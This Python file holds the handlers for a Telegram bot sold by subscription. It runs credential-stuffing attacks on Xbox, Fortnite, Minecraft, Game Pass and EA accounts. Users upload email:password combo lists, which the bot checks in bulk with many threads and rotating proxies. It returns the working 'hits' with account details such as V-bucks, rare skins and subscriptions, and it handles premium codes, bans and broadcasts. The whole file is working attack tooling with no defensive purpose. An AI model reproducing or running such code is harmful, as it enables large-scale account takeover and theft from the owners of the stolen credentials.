"""
╔══════════════════════════════════════════╗
║   MULTI-CHECKER BOT — HANDLERS          ║
║          MADE BY - @NUTFRR              ║
╚══════════════════════════════════════════╝
"""
import asyncio
import io
import logging
import os
import time
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime

from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import ContextTypes
from telegram.constants import ParseMode

from db.database import (
    upsert_user, get_user, is_premium, is_banned, get_premium_expiry,
    generate_code, redeem_code, revoke_code, list_codes,
    ban_user, unban_user, get_all_users, get_stats, set_premium,
    create_session, update_session, save_hit, get_session_hits,
    increment_user_checks,
)
from checkers.utils import parse_combos, CHECKER_DISPLAY, CHECKER_EMOJI
from checkers.xbox_checker     import check_xbox
from checkers.fortnite_checker import check_fortnite
from checkers.minecraft_checker import check_minecraft
from checkers.gamepass_checker  import check_gamepass
from checkers.ea_checker        import check_ea
from bot.keyboards import (
    main_menu, checker_menu, thread_speed_kb, cancel_kb,
    back_main_kb, back_checkers_kb, admin_panel_kb,
    code_gen_duration_kb, code_gen_uses_kb,
)
from bot.messages import (
    welcome_msg, not_premium_msg, banned_msg, help_msg, status_msg,
    checker_menu_msg, threads_msg, send_combos_msg, combos_loaded_msg,
    progress_msg, session_done_msg, hit_card,
    code_created_msg, redeem_success_msg, admin_stats_msg, BANNER,
)

logger    = logging.getLogger(__name__)
ADMIN_ID  = int(os.environ.get("ADMIN_ID", "8381786447"))

# active sessions: user_id → state dict
_active: dict[int, dict] = {}
_executor = ThreadPoolExecutor(max_workers=80)

CHECKER_FN = {
    "xbox":      check_xbox,
    "fortnite":  check_fortnite,
    "minecraft": check_minecraft,
    "gamepass":  check_gamepass,
    "ea":        check_ea,
}

STATUS_HIT    = "HIT"
STATUS_BAD    = "BAD"
STATUS_2FA    = "2FA"
STATUS_LOCKED = "LOCKED"
STATUS_RATE   = "RATELIMIT"
STATUS_NO_XBOX = "NO_XBOX"
STATUS_NO_MC   = "NO_MINECRAFT"
STATUS_NO_EA   = "NO_EA"
STATUS_NO_SUB  = "NO_SUBSCRIPTION"


# ─── HELPERS ──────────────────────────────────────────────────────────────────

def _is_admin(uid: int) -> bool:
    return uid == ADMIN_ID


async def _ensure_user(update: Update) -> bool:
    u = update.effective_user
    upsert_user(u.id, u.username or "", u.first_name or "")
    if is_banned(u.id):
        await update.effective_message.reply_text(banned_msg(), parse_mode=ParseMode.MARKDOWN)
        return False
    return True


async def _safe_edit(msg, text: str, kb=None, **kw):
    try:
        kw.setdefault("parse_mode", ParseMode.MARKDOWN)
        if kb:
            kw["reply_markup"] = kb
        await msg.edit_text(text, **kw)
    except Exception:
        pass


def _combo_preview(combos: list, limit: int = 5) -> str:
    lines = []
    for email, pw in combos[:limit]:
        masked = pw[:2] + "•" * max(0, len(pw) - 4) + pw[-2:] if len(pw) > 4 else "••••"
        lines.append(f"`{email}` : `{masked}`")
    if len(combos) > limit:
        lines.append(f"_...and {len(combos) - limit:,} more_")
    return "\n".join(lines)


# ─── /start, /help, /status, /redeem ─────────────────────────────────────────

async def cmd_start(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not await _ensure_user(update): return
    u = update.effective_user
    await update.effective_message.reply_text(
        welcome_msg(u.first_name, is_premium(u.id), _is_admin(u.id)),
        parse_mode=ParseMode.MARKDOWN,
        reply_markup=main_menu(is_premium(u.id), _is_admin(u.id)),
    )


async def cmd_help(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not await _ensure_user(update): return
    await update.effective_message.reply_text(
        help_msg(), parse_mode=ParseMode.MARKDOWN, reply_markup=back_main_kb()
    )


async def cmd_status(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not await _ensure_user(update): return
    u     = update.effective_user
    row   = get_user(u.id)
    checks= row["total_checks"] if row else 0
    await update.effective_message.reply_text(
        status_msg(u.id, u.first_name, is_premium(u.id), get_premium_expiry(u.id), checks),
        parse_mode=ParseMode.MARKDOWN, reply_markup=back_main_kb(),
    )


async def cmd_redeem(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not await _ensure_user(update): return
    u = update.effective_user
    if not ctx.args:
        await update.effective_message.reply_text(
            "🎟️ *Redeem a Code*\n\nUsage: `/redeem YOUR-CODE`",
            parse_mode=ParseMode.MARKDOWN
        )
        return
    res = redeem_code(u.id, ctx.args[0].strip())
    if res["ok"]:
        await update.effective_message.reply_text(
            redeem_success_msg(res["days"], res["expires_at"]),
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=main_menu(True, _is_admin(u.id)),
        )
    else:
        await update.effective_message.reply_text(res["error"], parse_mode=ParseMode.MARKDOWN)


# ─── ADMIN COMMANDS ───────────────────────────────────────────────────────────

async def cmd_gencode(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not _is_admin(update.effective_user.id): return
    uses = int(ctx.args[0]) if ctx.args else 1
    days = int(ctx.args[1]) if len(ctx.args) > 1 else 30
    code = generate_code(update.effective_user.id, uses, days)
    await update.effective_message.reply_text(
        code_created_msg(code, uses, days), parse_mode=ParseMode.MARKDOWN
    )


async def cmd_revoke(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not _is_admin(update.effective_user.id): return
    if not ctx.args:
        await update.effective_message.reply_text("Usage: `/revoke CODE`", parse_mode=ParseMode.MARKDOWN); return
    ok = revoke_code(ctx.args[0])
    await update.effective_message.reply_text("✅ Revoked." if ok else "❌ Not found.")


async def cmd_addpremium(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not _is_admin(update.effective_user.id): return
    if len(ctx.args) < 2:
        await update.effective_message.reply_text("Usage: `/addpremium USER_ID DAYS`", parse_mode=ParseMode.MARKDOWN); return
    exp = set_premium(int(ctx.args[0]), int(ctx.args[1]))
    await update.effective_message.reply_text(
        f"✅ Premium set for `{ctx.args[0]}` until `{exp.strftime('%d %b %Y')}`",
        parse_mode=ParseMode.MARKDOWN,
    )


async def cmd_ban(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not _is_admin(update.effective_user.id): return
    if not ctx.args: return
    ban_user(int(ctx.args[0]))
    await update.effective_message.reply_text(f"🚫 `{ctx.args[0]}` banned.", parse_mode=ParseMode.MARKDOWN)


async def cmd_unban(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not _is_admin(update.effective_user.id): return
    if not ctx.args: return
    unban_user(int(ctx.args[0]))
    await update.effective_message.reply_text(f"✅ `{ctx.args[0]}` unbanned.", parse_mode=ParseMode.MARKDOWN)


async def cmd_broadcast(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not _is_admin(update.effective_user.id): return
    if not ctx.args: return
    msg  = " ".join(ctx.args)
    users= get_all_users(10000)
    sent = failed = 0
    for row in users:
        try:
            await ctx.bot.send_message(row["user_id"], msg, parse_mode=ParseMode.MARKDOWN)
            sent += 1
        except Exception:
            failed += 1
        await asyncio.sleep(0.05)
    await update.effective_message.reply_text(f"📢 Done: ✅{sent} ❌{failed}")


# ─── CALLBACK HANDLER ─────────────────────────────────────────────────────────

async def on_callback(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    await q.answer()
    u     = q.from_user
    upsert_user(u.id, u.username or "", u.first_name or "")
    if is_banned(u.id):
        await q.message.reply_text(banned_msg(), parse_mode=ParseMode.MARKDOWN); return

    data    = q.data
    admin   = _is_admin(u.id)
    premium = is_premium(u.id)

    # ── navigation ────────────────────────────────────────────────────────────
    if data == "back_main":
        await _safe_edit(q.message, welcome_msg(u.first_name, premium, admin), main_menu(premium, admin))

    elif data == "help":
        await _safe_edit(q.message, help_msg(), back_main_kb())

    elif data == "my_status":
        row    = get_user(u.id)
        checks = row["total_checks"] if row else 0
        await _safe_edit(q.message,
            status_msg(u.id, u.first_name, premium, get_premium_expiry(u.id), checks),
            back_main_kb())

    elif data == "buy_premium":
        await _safe_edit(q.message,
            f"💎 *Get Premium*\n\nPurchase from *@NUTFRR*\n\n"
            f"🎟️ Already have a code?\n`/redeem YOUR-CODE`",
            back_main_kb())

    elif data == "redeem":
        await _safe_edit(q.message, "🎟️ Send: `/redeem YOUR-CODE-HERE`", back_main_kb())

    # ── checker menu ──────────────────────────────────────────────────────────
    elif data == "menu_checkers":
        if not premium and not admin:
            await _safe_edit(q.message, not_premium_msg(), back_main_kb()); return
        await _safe_edit(q.message, checker_menu_msg(), checker_menu())

    elif data.startswith("chk_"):
        checker = data.replace("chk_", "")
        if not premium and not admin:
            await _safe_edit(q.message, not_premium_msg(), back_main_kb()); return
        if u.id in _active:
            await _safe_edit(q.message,
                f"⚠️ You already have an active session running.\n"
                f"Stop it first or wait for it to finish.",
                cancel_kb()); return
        name = CHECKER_DISPLAY.get(checker, checker)
        ctx.user_data["pending_checker"] = checker
        await _safe_edit(q.message, threads_msg(name), thread_speed_kb(checker))

    elif data.startswith("threads_"):
        # format: threads_CHECKER_THREADS
        _, checker, t = data.split("_", 2)
        threads = int(t)
        if not premium and not admin:
            await _safe_edit(q.message, not_premium_msg(), back_main_kb()); return
        ctx.user_data["checker"]         = checker
        ctx.user_data["threads"]         = threads
        ctx.user_data["awaiting_combos"] = True
        name = CHECKER_DISPLAY.get(checker, checker)
        await _safe_edit(q.message, send_combos_msg(name, threads), back_checkers_kb())

    elif data == "check_stop":
        if u.id in _active:
            _active[u.id]["running"] = False
            await q.answer("🛑 Stop requested", show_alert=False)
        else:
            await _safe_edit(q.message, "No active session.", back_main_kb())

    # ── admin panel ───────────────────────────────────────────────────────────
    elif data == "admin_panel":
        if not admin: return
        await _safe_edit(q.message, "🛠️ *Admin Panel*", admin_panel_kb())

    elif data == "admin_gencode":
        if not admin: return
        ctx.user_data["cg_step"] = "duration"
        await _safe_edit(q.message, "🎟️ *Generate Code — Step 1*\nSelect duration:", code_gen_duration_kb())

    elif data.startswith("cg_days_"):
        if not admin: return
        ctx.user_data["cg_days"] = int(data.replace("cg_days_", ""))
        await _safe_edit(q.message, "🎟️ *Step 2* — Select uses:", code_gen_uses_kb())

    elif data.startswith("cg_uses_"):
        if not admin: return
        uses = int(data.replace("cg_uses_", ""))
        days = ctx.user_data.get("cg_days", 30)
        code = generate_code(u.id, uses, days)
        await _safe_edit(q.message, code_created_msg(code, uses, days), admin_panel_kb())

    elif data == "admin_listcodes":
        if not admin: return
        codes = list_codes(20)
        if not codes:
            await _safe_edit(q.message, "No codes yet.", admin_panel_kb()); return
        lines = ["📋 *Recent Codes*\n"]
        for c in codes:
            st = "🚫" if c["is_revoked"] else f"🟢 {c['uses_left']}/{c['uses_total']}"
            lines.append(f"`{c['code']}` — {c['days']}d — {st}")
        await _safe_edit(q.message, "\n".join(lines), admin_panel_kb())

    elif data == "admin_listusers":
        if not admin: return
        users = get_all_users(30)
        lines = ["👥 *Recent Users*\n"]
        for row in users:
            prem = "💎" if row["premium_until"] else "🆓"
            ban  = "🚫" if row["is_banned"] else ""
            name = row["first_name"] or row["username"] or str(row["user_id"])
            lines.append(f"{prem}{ban} `{row['user_id']}` — {name} ({row['total_checks']}✓)")
        await _safe_edit(q.message, "\n".join(lines[:40]), admin_panel_kb())

    elif data == "admin_stats":
        if not admin: return
        await _safe_edit(q.message, admin_stats_msg(get_stats()), admin_panel_kb())

    elif data in ("admin_ban", "admin_unban", "admin_broadcast"):
        if not admin: return
        cmds = {
            "admin_ban":       "/ban USER_ID",
            "admin_unban":     "/unban USER_ID",
            "admin_broadcast": "/broadcast message",
        }
        await _safe_edit(q.message, f"Send: `{cmds[data]}`", admin_panel_kb())

    elif data == "stats":
        s = get_stats()
        await _safe_edit(q.message,
            f"📊 *Stats*\n\n👥 Users: `{s['total_users']:,}`\n"
            f"✅ Checks: `{s['total_checks']:,}`\n🎯 Hits: `{s['total_hits']:,}`",
            back_main_kb())


# ─── MESSAGE HANDLER (combos) ─────────────────────────────────────────────────

async def on_message(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not await _ensure_user(update): return
    u = update.effective_user
    if not is_premium(u.id) and not _is_admin(u.id): return
    if not ctx.user_data.get("awaiting_combos"): return

    msg     = update.effective_message
    checker = ctx.user_data.get("checker", "xbox")
    threads = ctx.user_data.get("threads", 20)

    # read combos
    combo_text = None
    if msg.document:
        file = await ctx.bot.get_file(msg.document.file_id)
        import io as _io
        bio  = _io.BytesIO()
        await file.download_to_memory(bio)
        combo_text = bio.getvalue().decode("utf-8", errors="ignore")
    elif msg.text:
        combo_text = msg.text

    if not combo_text:
        await msg.reply_text("❌ Could not read combos. Send a .txt file or paste text.")
        return

    combos = parse_combos(combo_text)
    if not combos:
        await msg.reply_text(
            "❌ No valid combos found.\n\nFormat: `email:password` one per line.",
            parse_mode=ParseMode.MARKDOWN
        )
        return
    if len(combos) > 50_000:
        await msg.reply_text("❌ Max 50,000 combos per session.")
        return

    ctx.user_data["awaiting_combos"] = False
    checker_name = CHECKER_DISPLAY.get(checker, checker)
    session_id   = create_session(u.id, checker)
    preview      = _combo_preview(combos)

    _active[u.id] = {
        "session_id": session_id,
        "checker":    checker,
        "running":    True,
        "hits":       0, "bad": 0, "twofa": 0, "locked": 0, "rate": 0,
        "checked":    0, "total": len(combos), "hit_num": 0, "cpm": 0,
        "start_ts":   time.monotonic(),
    }

    start_msg = await msg.reply_text(
        combos_loaded_msg(checker_name, len(combos), threads, preview, session_id),
        parse_mode=ParseMode.MARKDOWN,
        reply_markup=cancel_kb(),
    )
    asyncio.create_task(
        _run_check(u.id, session_id, checker, combos, threads, start_msg, ctx)
    )


# ─── CHECKER TASK ─────────────────────────────────────────────────────────────

async def _run_check(user_id: int, session_id: int, checker: str,
                     combos: list, threads: int, status_msg_obj,
                     ctx: ContextTypes.DEFAULT_TYPE):
    loop      = asyncio.get_event_loop()
    state     = _active[user_id]
    sem       = asyncio.Semaphore(threads)
    check_fn  = CHECKER_FN[checker]
    checker_name = CHECKER_DISPLAY.get(checker, checker)
    proxies   = ctx.user_data.get("proxies", [])
    proxy_idx = 0
    last_edit = time.monotonic()

    async def _check_one(email: str, password: str):
        nonlocal proxy_idx
        async with sem:
            if not state["running"]:
                return
            proxy = proxies[proxy_idx % len(proxies)] if proxies else None
            if proxies:
                proxy_idx += 1

            result = await loop.run_in_executor(_executor, check_fn, email, password, proxy)
            status = result.get("status", "ERROR")
            state["checked"] += 1

            if status == STATUS_HIT:
                state["hits"]    += 1
                state["hit_num"] += 1
                save_hit(session_id, user_id, checker, result)
                try:
                    card = hit_card(checker, result, state["hit_num"])
                    await ctx.bot.send_message(
                        chat_id=user_id, text=card, parse_mode=ParseMode.MARKDOWN
                    )
                except Exception:
                    pass
            elif status == STATUS_BAD:
                state["bad"] += 1
            elif status == STATUS_2FA:
                state["twofa"] += 1
            elif status == STATUS_LOCKED:
                state["locked"] += 1
            elif status in (STATUS_RATE,):
                state["rate"] += 1
                await asyncio.sleep(1.5)  # back off on ratelimit

            # update CPM
            elapsed = time.monotonic() - state["start_ts"]
            state["cpm"] = int((state["checked"] / elapsed) * 60) if elapsed > 0 else 0

    # live progress edits every 5s
    async def _progress_updater():
        while state["running"] and state["checked"] < state["total"]:
            await asyncio.sleep(5)
            nonlocal last_edit
            if time.monotonic() - last_edit >= 5:
                try:
                    await status_msg_obj.edit_text(
                        progress_msg(
                            checker_name,
                            state["checked"], state["total"],
                            state["hits"], state["bad"],
                            state["twofa"], state["locked"],
                            state["cpm"],
                        ),
                        parse_mode=ParseMode.MARKDOWN,
                        reply_markup=cancel_kb(),
                    )
                    last_edit = time.monotonic()
                except Exception:
                    pass

    updater = asyncio.create_task(_progress_updater())
    tasks   = [asyncio.create_task(_check_one(e, p)) for e, p in combos]
    await asyncio.gather(*tasks, return_exceptions=True)
    updater.cancel()

    elapsed = time.monotonic() - state["start_ts"]
    update_session(
        session_id,
        total=state["checked"], hits=state["hits"], bad=state["bad"],
        twofa=state["twofa"], locked=state["locked"], status="done",
    )
    increment_user_checks(user_id, state["checked"])
    state["running"] = False

    # final message
    try:
        await ctx.bot.send_message(
            chat_id=user_id,
            text=session_done_msg(
                checker_name, state["checked"], state["hits"], state["bad"],
                state["twofa"], state["locked"], state["rate"], elapsed,
            ),
            parse_mode=ParseMode.MARKDOWN,
        )
    except Exception:
        pass

    # send hits file
    if state["hits"] > 0:
        rows  = get_session_hits(session_id)
        lines = []
        for row in rows:
            import json
            try:
                d = json.loads(row["data_json"]) if row["data_json"] else {}
            except Exception:
                d = {}
            d.update({"email": row["email"], "password": row["password"]})
            line = f"{d['email']}:{d['password']}"
            # append key fields by checker
            if checker == "xbox":
                line += f" | GT:{d.get('gamertag','')} | GS:{d.get('gamerscore','')} | GPU:{d.get('game_pass_ultimate','')} | Gold:{d.get('gold_expiry','')} | Country:{d.get('country','')}"
            elif checker == "fortnite":
                line += f" | IGN:{d.get('display_name','')} | VB:{d.get('vbucks',0)} | Skins:{d.get('skins',0)} | BP:{d.get('battle_pass','')} | Rare:{','.join(d.get('rare_skins',[]))}"
            elif checker == "minecraft":
                line += f" | User:{d.get('username','')} | Java:{d.get('java','')} | Bedrock:{d.get('bedrock','')} | Cape:{d.get('has_cape','')}"
            elif checker == "gamepass":
                line += f" | GPU:{d.get('game_pass_ultimate','')} | PCG:{d.get('game_pass_pc','')} | Gold:{d.get('gold_expiry','')} | Country:{d.get('country','')}"
            elif checker == "ea":
                line += f" | IGN:{d.get('display_name','')} | EAPlay:{d.get('ea_play','')} | EAPro:{d.get('ea_play_pro','')} | Exp:{d.get('ea_play_expiry','')}"
            lines.append(line)

        bio = io.BytesIO("\n".join(lines).encode())
        bio.name = f"{checker}_hits_{session_id}.txt"
        try:
            await ctx.bot.send_document(
                chat_id=user_id,
                document=bio,
                caption=f"🎯 *{state['hits']} {CHECKER_DISPLAY.get(checker,checker)} Hits*\n"
                        f"Session #{session_id}\n👑 @NUTFRR",
                parse_mode=ParseMode.MARKDOWN,
            )
        except Exception as e:
            logger.error("send hits file error: %s", e)

    _active.pop(user_id, None)
